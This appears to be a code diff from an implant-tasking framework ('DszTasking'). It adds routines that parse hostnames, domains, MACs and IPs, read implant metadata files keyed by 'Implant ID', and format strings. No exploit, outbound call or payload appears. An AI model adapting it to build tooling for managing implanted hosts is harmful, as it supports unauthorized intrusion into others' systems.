+				FindHostInformation_HostName($element[$i],		$hostName);
+				FindHostInformation_DomainName($element[$i],	$domain);
+				FindHostInformation_Interface($element[$i],		$macAddresses);
+				FindHostInformation_Ips($element[$i],			$ipAddresses);
+			}
+		}
+	}
+}
+
+#--------------------------------------------------------------------------
+sub FindHostInformation_HostName(IN object $parent, REF string $hostName) {
+	object $element;
+	if (GetObjectData($parent, "element", $element) && defined($element)) {
+		for (int $i = 0; $i < sizeof($element); $i++) {
+			string $name;
+			if (GetObjectData($element[$i], "name", $name) && defined($name) && $name == "HostName") {
+				string $text;
+				if (GetObjectData($element[$i], "text::text", $text) && defined($text)) {
+					$hostName = $text;
+				}
+			}
+		}
+	}
+}
+
+#--------------------------------------------------------------------------
+sub FindHostInformation_DomainName(IN object $parent, REF string $domain) {
+	object $element;
+	if (GetObjectData($parent, "element", $element) && defined($element)) {
+		for (int $i = 0; $i < sizeof($element); $i++) {
+			string $name;
+			if (GetObjectData($element[$i], "name", $name) && defined($name) && $name == "Domain") {
+				string $text;
+				if (GetObjectData($element[$i], "text::text", $text) && defined($text)) {
+					$domain = $text;
+				}
+			}
+		}
+	}
+}
+
+#--------------------------------------------------------------------------
+sub FindHostInformation_Interface(IN object $parent, REF string $macAddresses) {
+	object $element;
+	if (GetObjectData($parent, "element", $element) && defined($element)) {
+		for (int $i = 0; $i < sizeof($element); $i++) {
+			string $name;
+			if (GetObjectData($element[$i], "name", $name) && defined($name) && $name == "Interface") {
+				string $text;
+				if (GetObjectData($element[$i], "element[0]::text::text", $text) && defined($text)) {
+					AppendString($macAddresses, $text);
+				}
+			}
+		}
+	}
+}
+
+#--------------------------------------------------------------------------
+sub FindHostInformation_Ips(IN object $parent, REF string $ipAddresses) {
+	object $element;
+	if (GetObjectData($parent, "element", $element) && defined($element)) {
+		for (int $i = 0; $i < sizeof($element); $i++) {
+			string $name;
+			if (GetObjectData($element[$i], "name", $name) && defined($name) && $name == "Ips") {
+				string $text;
+				if (GetObjectData($element[$i], "element::text::text", $text) && defined($text)) {
+					for (int $j = 0; $j < sizeof($text); $j++) {
+						AppendString($ipAddresses, $text[$j]);
+					}
+				}
+			}
+		}
+	}
+}
+
+#--------------------------------------------------------------------------
+# Gets metadata information
+#--------------------------------------------------------------------------
+sub FindMetadataInformation(IN string $filename, 
+							OUT int $pcIds, 
+							OUT string $macAddresses, 
+							OUT string $ipAddresses,
+							REF string $hostname, 
+							REF string $domain) {
+	string $lines;
+	# Read metadata file and compare ids
+	if (!ReadFile ($filename, $lines)) {
+		return false;
+	}
+	
+	for (int $i = 0; $i < sizeof($lines); $i++) {
+		if (RegexMatch("#.*", $lines[$i])) {
+			continue;
+		}
+		string $match;
+		if (RegexMatch("Implant ID:[ \t]*(.*)", $lines[$i], $match)) {
+			AppendInteger($pcIds, <int>$match);
+		}
+		if (RegexMatch("MAC:[ \\t]*(.*)", $lines[$i], $match)) {
+			SplitLength($match, ",", $macAddresses);
+		}
+		if (RegexMatch("IP:[ \\t]*(.*)", $lines[$i], $match)) {
+			SplitLength($match, ",", $ipAddresses);
+		}
+		if (RegexMatch("Hostname:[ \\t]*(.*)", $lines[$i], $match)) {
+			$hostname = $match;
+		}
+		if (RegexMatch("Domain:[ \\t]*(.*)", $lines[$i], $match)) {
+			$domain = $match;
+		}
+	}
+
+	return true;
+}
+
+#--------------------------------------------------------------------------
+sub SplitLength(IN string $value, IN string $sep, REF string $array) {
+	string $match;
+	if (RegexMatch("([^$sep]*)$sep(.*)", $value, $match)) {
+		AppendString($array, Trim($match[0]));
+		SplitLength($match[1], $sep, $array);
+	} else {
+		AppendString($array, Trim($value));
+	}
+}
+
+#--------------------------------------------------------------------------
+sub(string) Trim(IN string $value) {
+	string $match;
+	if (RegexMatch("[ \\t]*([^ ]*)[ \\t]*", $value, $match)) {
+		return $match;
+	}
+	return $value;
+}
+
+#--------------------------------------------------------------------------
+sub AppendInteger(REF int $items, IN int $newItem) {
+	for (int $i = 0; $i < sizeof($items); $i++) {
+		if ($items[$i] == $newItem) {
+			return true;
+		}
+	}
+	return _AppendInteger($items, $newItem);
+}
+
+#--------------------------------------------------------------------------
+sub AppendString(REF string $items, IN string $newItem) {
+	for (int $i = 0; $i < sizeof($items); $i++) {
+		if ($items[$i] == $newItem) {
+			return true;
+		}
+	}
+	return _AppendString($items, $newItem);
+}
+
+#--------------------------------------------------------------------------
+sub(string) NumberToHexString(IN int $num, IN int $space) {
+	@hex on;
+	string $str = "$num";
+	# remove leading 0x
+	string $match;
+	if (RegexMatch("0x(.*)", $str, $match)) {
+		$str = $match;
+	}
+	while (strlen($str) < $space) {
+		$str = "0$str";
+	}
+	return "0x$str";
+}
+
+#--------------------------------------------------------------------------
+sub(string) PadRightString(IN string $value, IN int $space) {
+	while (strlen($value) < $space) {
+		StrCat($value, " ");
+	}
+	return $value;
+}
+
+#--------------------------------------------------------------------------
+sub(string) PadLeftString(IN string $value, IN int $space) {
+	while (strlen($value) < $space) {
+		$value = " $value";
+	}
+	return $value;
+}
+
+#--------------------------------------------------------------------------
+sub(string) CenterString(IN string $value, IN int $space) {
+	while (strlen($value) < $space) {
+		if (strlen($value) < $space) {
+			$value = " $value";
+		}
+		if (strlen($value) < $space) {
+			StrCat($value, " ");
+		}
+	}
+	return $value;
+}
+
+#--------------------------------------------------------------------------
+sub(string) Repeat(IN string $value, IN int $count) {
+	string $retVal = "";
+	for (int $i = 0; $i < $count; $i++) {
+		StrCat($retVal, $value);
+	}
+	return $retVal;
+}
+
+#--------------------------------------------------------------------------
+sub(int) max(IN int $a, IN int $b) {
+	if ($a > $b) {
+		return $a;
+	}
+	return $b;
+}
+
+#-----------------------------------------------------------------------------------------
+sub(string) GetProjectVersion()
+{
+	string $resDir;
+	if (_GetLpResourcesDirectory($resDir))
+	{
+		string $xmlFile = "$resDir/Tasking/Version.xml";
+		
+		_XmlElement @version;
+		if (_XmlReadFile($xmlFile, "Version", @version))
+		{
+			return @version.$text;
+		}
+	}
+	
+	return "DszTasking 0.0.0.0";
+}
